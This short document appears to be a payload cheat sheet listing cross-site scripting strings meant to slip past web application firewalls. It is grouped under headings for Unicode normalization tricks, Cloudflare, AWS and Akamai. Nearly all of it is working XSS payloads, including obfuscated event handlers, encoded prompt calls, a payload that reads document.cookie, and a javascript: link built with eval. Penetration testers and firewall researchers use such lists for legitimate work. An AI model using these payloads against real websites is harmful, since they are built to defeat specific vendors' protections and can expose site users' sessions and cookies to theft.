## NFKC Unicode Normalization

```
%EF%B9%A4 -> <
%EF%B9%A5 -> <
```

## Cloudflare

```
<img src=x on onerror=alert()>
<svg/on/onload=alert(origin)>
<img src=x oNlY=1 oNerror=alert('xxs')//
```

```
<svg onload=prompt%26%230000000040document.domain)>
<svg onload=prompt%26%23x000000028;document.domain)>
```

## AWS

```
'%22%3E%3Casuka%20AutoFocus%20ContentEditable%20OnFocusIn%3D_%3Dalert%2C_%28document.cookie%29%3E'
```

## Akamai

```
<A href="javascrip%09t&colon;eval.apply`${[jj.className+`(23)`]}`" id=jj class=alert>Click Here
```
